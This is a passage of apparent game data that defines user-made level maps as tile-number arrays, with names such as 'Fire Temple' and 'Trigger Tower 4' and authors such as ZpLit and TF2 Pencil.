Down",author="ZpLit",id="#1662678735",direction="forward",cost=184,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,30,30,126,30,30,126,30,10,10,10,10,30,126,30,30,126,30,30,0,0,30,30,30,30,30,30,30,10,10,10,10,30,30,30,30,30,30,30,0,0,30,30,0,0,0,0,0,10,10,10,10,0,0,0,0,0,30,30,0,0,128,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,129,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,30,30,0,0,0,0,0,0,1,1,0,0,0,0,0,0,30,30,0,0,128,30,0,0,0,0,0,1,0,0,1,0,0,0,0,0,30,129,0,0,30,30,0,0,0,0,1,0,0,0,0,1,0,0,0,0,30,30,0,0,30,30,0,0,0,0,1,0,0,0,0,1,0,0,0,0,30,30,0,0,128,30,0,0,0,0,0,1,0,0,1,0,0,0,0,0,30,129,0,0,30,30,0,0,0,0,0,0,1,1,0,0,0,0,0,0,30,30,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,128,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,129,0,0,30,30,0,0,0,0,0,86,10,10,86,0,0,0,0,0,30,30,0,0,30,30,30,30,30,30,30,10,10,10,10,30,30,30,30,30,30,30,0,0,30,30,127,30,30,127,30,10,10,10,10,30,127,30,30,127,30,30,0,0,0,0,0,0,0,0,0,88,10,10,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="The End",author="ZpLit",id="#1662679237",direction="left",cost=161,elevation=2,map=[0,0,0,0,0,0,0,12,94,90,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,7,7,7,7,7,128,0,0,0,5,90,5,5,0,0,0,0,0,0,0,7,75,75,75,75,7,0,0,0,5,5,5,90,0,0,0,0,0,0,0,7,1,75,75,75,7,0,0,0,90,5,5,5,0,0,0,0,0,0,0,87,7,7,7,7,125,7,6,5,5,5,5,5,0,0,0,0,0,0,0,2,7,1,75,75,7,7,6,5,5,5,5,5,0,0,0,0,0,0,0,2,7,1,75,75,7,7,6,5,5,5,90,5,0,0,0,0,0,0,0,87,7,7,7,7,125,7,6,5,5,5,5,5,0,0,0,0,0,0,0,7,1,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fire Temple",author="ZpLit",id="#1662685232",direction="right",cost=583,elevation=7,map=[10,45,2,2,10,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,10,45,45,45,10,1,8,8,8,8,8,24,58,100,58,24,8,8,8,1,11,46,46,46,11,1,8,76,76,76,76,24,58,58,58,24,76,76,8,1,12,47,47,47,12,1,8,76,76,76,76,11,15,77,16,11,76,16,8,1,13,48,48,48,13,1,8,76,76,76,76,11,11,13,11,11,76,76,8,1,14,49,49,49,14,1,8,76,13,76,76,8,11,11,11,8,76,17,8,1,15,50,50,50,15,1,8,76,76,76,76,76,76,76,76,76,76,76,8,1,16,51,51,51,16,1,8,76,76,11,76,8,76,9,76,76,76,76,8,1,17,52,52,52,17,17,12,90,76,76,76,76,76,76,76,76,76,76,8,1,17,52,52,52,52,52,12,12,32,31,76,76,31,31,31,76,76,31,12,2,17,52,52,52,52,52,12,12,32,31,76,76,31,31,31,76,76,31,12,2,17,52,52,52,17,17,12,90,76,76,76,76,76,76,76,76,76,76,8,1,0,17,17,17,0,1,8,76,76,11,76,8,76,9,76,76,76,76,8,1,0,0,0,0,0,1,8,76,76,76,76,76,76,76,76,76,76,76,8,1,0,0,0,0,0,1,8,76,13,76,76,8,11,11,11,8,76,17,8,1,0,0,0,0,0,1,8,76,76,76,76,11,11,13,11,11,76,76,8,1,0,0,0,0,0,1,8,76,76,76,76,11,15,77,16,11,76,16,8,1,0,0,0,0,0,1,8,76,76,76,76,24,58,58,58,24,76,76,8,1,0,0,0,0,0,1,8,8,8,8,8,24,58,100,58,24,8,8,8,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="Dipshits Down Again",author="ZpLit",id="#1662693704",direction="forward",cost=216,elevation=0,map=[0,0,0,0,126,0,0,0,0,2,2,0,0,0,0,126,0,0,0,0,0,0,39,39,40,41,42,100,0,14,14,0,100,42,41,40,39,39,0,0,0,128,38,0,0,0,0,0,0,14,14,0,0,0,0,0,0,38,129,0,0,0,37,0,0,0,0,0,0,34,34,0,0,0,0,0,0,37,0,0,0,0,36,0,0,0,0,0,0,34,34,0,0,0,0,0,0,36,0,0,0,0,35,0,0,1,1,1,0,34,34,0,1,1,1,0,0,35,0,0,0,128,34,34,0,0,0,0,0,34,34,0,0,0,0,0,34,34,129,0,0,0,34,14,14,34,34,126,34,14,14,34,126,34,34,14,14,34,0,0,0,0,0,14,14,34,34,34,34,14,14,34,34,34,34,14,14,0,0,0,1,1,0,34,34,0,0,0,0,0,0,0,0,0,0,34,34,0,1,1,57,18,0,128,34,0,0,0,0,0,0,0,0,0,0,34,129,0,18,57,57,18,0,34,34,0,0,0,0,1,1,0,0,0,0,34,34,0,18,57,57,18,0,34,34,0,0,0,1,0,0,1,0,0,0,34,34,0,18,57,57,18,0,34,34,0,0,0,0,1,1,0,0,0,0,34,34,0,18,57,57,18,0,34,34,0,0,0,0,0,0,0,0,0,0,34,34,0,18,57,57,18,0,128,34,0,0,0,0,0,0,0,0,0,0,34,129,0,18,57,1,1,0,14,14,34,34,34,34,14,14,34,34,34,34,14,14,0,1,1,0,0,0,14,14,34,127,34,34,14,14,34,34,127,34,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,88,2,2,88,1,1,1,0,0,0,0,0]});
maps.push({name="Updraft",author="ZpLit",id="#1662696855",direction="forward",cost=116,elevation=19,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,127,127,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,125,125,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="how did u guys die",author="alli",id="#1662708702",direction="forward",cost=139,elevation=-16,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,14,14,13,12,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,14,14,13,12,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,14,14,13,12,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,14,14,13,12,12,0,0,0,0,0,0,23,23,0,0,0,0,0,0,15,15,15,0,11,11,0,0,0,0,0,0,23,23,0,0,0,0,0,0,15,15,0,0,11,11,0,0,0,0,0,0,23,23,0,0,0,0,0,0,15,15,0,0,11,11,0,0,0,0,0,0,23,23,23,0,0,0,0,0,15,15,0,0,11,11,11,0,0,0,0,0,0,22,22,0,0,0,0,16,16,16,0,0,0,10,10,0,0,0,0,0,0,22,22,0,0,0,0,16,16,0,0,0,0,10,10,0,0,0,0,0,0,22,22,0,0,0,0,16,16,0,0,0,0,10,10,0,0,0,0,0,0,22,22,22,0,0,0,16,16,0,0,0,0,10,10,10,0,0,0,0,0,0,21,21,0,0,17,17,17,0,0,0,0,0,9,9,0,0,0,0,0,0,21,21,0,0,17,17,0,0,0,0,0,0,9,9,0,0,0,0,0,0,21,21,0,0,17,17,0,0,0,0,0,0,9,9,0,0,0,0,0,0,21,21,21,0,17,17,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,20,20,19,18,18,0,0,0,93,0,0,0,8,8,8,8,0,0,0,0,20,20,19,18,18,0,0,0,35,0,34,0,8,8,8,8,0,0,0,0,20,20,19,18,0,0,0,0,94,0,0,0,8,8,2,2]});
maps.push({name="Wall Strafes v3",author="sivi",id="#1662721040",direction="forward",cost=159,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,90,109,104,109,103,108,102,108,101,107,99,107,98,106,97,106,96,5,5,1,93,109,109,109,103,108,108,108,101,107,107,107,98,106,106,106,96,5,5,1,90,109,109,109,103,108,108,108,101,107,107,107,98,106,106,0,0,0,0,1,93,109,109,109,103,108,108,108,101,107,107,0,0,0,0,0,0,0,0,1,90,109,109,109,103,108,108,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Never Ever Lucky",author="ZpLit",id="#1662733144",direction="forward",cost=128,elevation=0,map=[0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,5,5,14,5,5,5,5,12,12,12,12,5,5,5,5,5,5,5,0,0,14,0,0,0,0,0,1,12,0,1,12,1,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,12,1,0,12,0,0,0,0,0,1,4,1,0,5,0,0,0,0,0,0,12,0,1,12,0,0,0,0,0,0,12,0,0,14,0,0,0,0,0,0,12,1,0,12,0,0,0,0,0,1,4,1,0,5,0,0,0,0,0,0,12,0,1,12,0,0,0,0,0,0,18,0,0,5,0,0,0,0,0,0,85,0,0,85,0,0,0,0,0,1,4,1,0,14,0,0,0,0,0,0,85,0,0,85,0,0,0,0,0,0,24,0,0,5,0,0,0,0,0,0,85,0,0,85,0,0,0,0,0,0,17,0,0,5,0,0,0,0,0,0,85,0,0,85,0,0,0,0,0,0,12,0,0,14,0,0,0,0,0,0,85,0,0,85,0,0,0,0,0,0,5,0,0,5,5,14,5,5,3,12,12,12,12,12,12,3,5,5,5,5,5,0,0,0,0,0,0,0,0,12,88,2,2,88,12,0,0,0,0,0,0,0]});
maps.push({name="A01 Race",author="ZpLit",id="#1662736241",direction="left",cost=277,elevation=0,map=[23,18,2,2,23,0,21,21,21,0,0,0,0,0,0,0,0,0,0,0,23,18,18,18,23,21,16,16,16,21,0,0,0,0,0,0,0,0,0,0,22,17,17,17,22,16,16,16,16,16,21,20,19,18,18,18,18,18,18,0,22,17,17,17,16,16,16,16,16,16,16,13,9,48,47,46,46,46,46,18,22,17,17,17,16,16,16,21,16,16,16,11,9,48,47,46,46,46,46,18,0,22,17,17,16,16,21,0,21,16,16,132,9,48,47,46,46,46,46,18,0,0,22,22,21,21,0,0,0,21,21,20,19,18,18,19,32,32,32,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,127,127,127,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,46,46,46,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,46,46,46,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,46,46,46,19,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,19,46,46,46,19,23,18,90,18,18,23,23,22,21,21,20,19,18,17,17,18,46,46,46,18,88,18,18,90,18,18,17,31,11,50,49,48,47,46,46,46,46,46,46,17,2,18,18,18,90,18,17,131,11,50,49,48,47,46,46,46,46,46,46,17,2,18,18,18,90,18,17,31,11,50,49,48,47,46,46,46,46,46,46,17,88,18,18,90,18,18,17,31,11,50,49,48,47,46,46,46,46,46,17,0,23,18,90,18,18,23,23,22,21,21,20,19,18,17,17,17,17,17,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Teleport Box",author="TF2 Pencil",id="#1662758863",direction="left",cost=251,elevation=8,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,12,12,0,0,0,1,132,20,0,0,60,60,135,135,20,132,1,0,0,0,12,12,0,0,0,1,20,20,0,0,60,60,135,135,20,20,1,0,0,0,12,12,0,0,0,1,0,0,0,0,60,60,135,135,135,135,1,0,0,0,12,12,0,0,0,1,20,0,20,0,60,60,135,135,135,135,1,0,0,0,12,12,0,0,0,1,0,0,0,0,60,60,135,135,135,135,1,0,0,12,12,12,2,20,20,120,60,60,60,60,60,60,60,60,60,60,1,0,0,12,131,12,2,20,20,120,60,60,60,60,60,60,60,60,60,60,1,0,0,12,12,12,0,0,0,1,76,76,76,76,60,60,66,66,66,66,1,0,0,0,0,0,0,0,0,1,20,76,20,76,60,60,66,66,66,66,1,0,0,0,0,0,0,0,0,1,76,76,76,76,60,60,66,66,66,66,1,0,0,0,0,0,0,0,0,1,20,20,76,76,60,60,66,66,20,20,1,0,0,0,0,0,0,0,0,1,132,20,76,76,60,60,66,66,20,132,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump or wait",author="37460",id="#1662758954",direction="forward",cost=323,elevation=10,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,96,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,96,12,12,0,0,0,0,0,22,22,22,22,22,22,22,3,18,18,18,18,18,12,12,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,74,74,74,74,74,67,74,74,74,74,74,67,74,74,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,74,74,74,74,74,67,74,74,74,74,74,67,74,74,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,74,74,74,74,74,67,74,74,74,74,74,67,74,74,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,74,74,74,74,74,67,74,74,74,74,74,67,74,74,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,22,22,22,22,22,22,18,97,18,18,18,18,4,12,0,0,0,0,0,22,22,22,22,22,22,22,18,18,18,18,18,18,12,12,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump Around 4",author="TF2 Pencil",id="#1662758995",direction="left",cost=94,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,125,125,0,0,0,0,0,0,0,0,0,0,39,39,0,125,34,0,125,29,29,29,0,0,0,0,0,0,0,0,0,0,39,39,0,34,34,0,29,29,29,29,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,2,24,24,24,24,24,24,24,39,39,0,128,44,0,44,44,44,44,0,0,2,24,24,24,24,24,24,24,39,39,0,128,44,0,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,0,39,39,0,125,125,0,0,0,0,0,0,0,0,0,0,39,39,39,39,0,39,39,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 2",author="TF2 Pencil",id="#1662786729",direction="forward",cost=136,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,132,9,9,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,1,131,9,9,9,9,0,0,0,0,128,9,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,1,131,9,9,9,9,0,0,0,0,128,9,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,1,131,9,9,9,9,0,0,0,0,128,9,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,1,9,9,9,9,9,9,0,0,0,0,128,9,0,0,0,0,0,0,0,1,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Boring Tunnel",author="TF2 Pencil",id="#1662786775",direction="right",cost=280,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,10,10,1,110,110,110,110,110,1,110,110,110,110,1,110,110,10,10,2,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,10,10,2,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,1,110,110,1,110,110,1,110,110,1,110,1,110,110,0,0,0,0,110,110,110,110,110,1,110,110,110,110,110,1,110,110,110,110,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors 5",author="TF2 Pencil",id="#1662786951",direction="left",cost=283,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,125,16,0,0,1,102,0,42,0,42,0,42,56,0,56,56,56,42,42,1,56,56,0,0,1,42,0,42,0,42,0,42,56,0,56,56,56,42,42,1,56,56,0,0,1,16,16,16,16,16,16,16,16,1,116,116,1,42,42,1,56,56,0,0,1,102,16,16,16,16,16,16,16,1,116,116,1,0,0,1,56,56,0,0,1,16,16,0,16,0,16,42,42,1,116,116,1,42,42,1,56,56,0,0,1,42,16,42,16,42,16,42,42,1,116,116,1,0,0,1,56,56,0,0,1,0,16,16,16,16,16,0,0,1,116,116,1,42,42,1,56,56,0,0,1,42,16,16,16,16,16,0,0,1,116,116,1,0,0,1,56,56,0,0,1,0,0,0,42,0,16,42,42,1,116,116,1,42,42,1,56,56,0,0,1,42,0,0,42,0,16,42,42,1,116,116,1,0,0,1,56,56,0,0,1,102,0,16,16,16,16,0,0,1,116,116,1,42,42,1,56,56,0,0,1,0,0,16,16,16,16,0,0,1,116,116,1,96,96,1,56,56,0,2,16,101,16,0,42,0,0,42,42,1,116,116,1,42,42,1,56,56,0,2,16,101,16,0,42,0,0,42,102,1,98,98,116,56,56,56,56,56,0,0,1,1,1,1,1,1,1,1,1,1,98,98,116,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,16,0,99,42,0]});
maps.push({name="Need Two Floors 6",author="TF2 Pencil",id="#1662786979",direction="right",cost=181,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,54,54,0,0,54,54,0,14,14,0,14,14,0,0,14,14,14,0,0,0,54,54,0,0,54,54,0,0,97,0,0,99,0,0,102,14,14,0,14,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,14,0,54,54,0,0,0,40,0,0,0,0,0,0,0,0,0,14,14,0,0,1,40,40,1,0,0,0,0,0,0,42,42,104,0,0,0,14,14,0,0,1,40,40,1,0,0,40,0,0,0,40,40,0,0,0,0,14,14,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,103,103,14,14,14,103,14,14,14,103,103,14,14,14,2,4,4,14,14,14,103,103,14,14,14,103,14,14,14,103,103,14,14,14,2,20,20,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,1,40,40,1,0,0,40,0,0,0,40,40,0,0,0,0,0,0,0,0,1,40,40,1,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,98,98,0,0,0,40,0,0,0,40,40,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,40,0,40,40,0,0,0,101,101,0,0,40,40,0,0,0,0,40,40,0,40,0,40,40,0,0,0,40,101,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 4",author="TF2 Pencil",id="#1662787035",direction="forward",cost=272,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,24,24,1,1,1,1,1,1,1,0,0,0,0,1,97,24,23,22,21,1,24,24,123,122,121,120,119,119,1,0,0,0,0,1,0,0,0,0,20,1,24,24,123,122,121,120,119,119,1,0,0,0,0,1,0,0,0,0,19,1,24,24,116,116,117,118,119,119,1,0,0,0,0,1,18,18,0,0,18,1,24,24,116,116,117,118,119,119,1,0,0,0,0,1,18,0,0,0,0,1,24,24,116,116,115,114,113,113,1,0,0,0,0,1,16,16,15,14,13,1,24,24,116,116,115,114,113,113,1,0,0,0,0,1,0,0,0,0,0,1,24,24,1,1,1,1,112,112,1,0,0,0,0,1,0,0,0,0,12,1,24,24,106,97,106,1,111,111,1,0,0,0,0,1,7,8,9,10,11,1,24,24,1,76,76,1,110,110,1,0,0,0,0,1,7,1,1,1,1,1,24,24,1,76,76,1,109,109,1,0,0,0,0,1,7,7,7,7,7,7,24,24,106,106,106,1,108,108,1,0,0,0,0,1,7,66,66,66,66,7,24,24,1,76,76,1,107,107,1,0,0,0,0,1,7,66,66,66,66,7,24,24,106,106,76,106,106,106,1,0,0,0,0,1,7,7,7,7,7,3,24,24,106,106,76,106,106,106,1,0,0,0,0,1,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 5",author="TF2 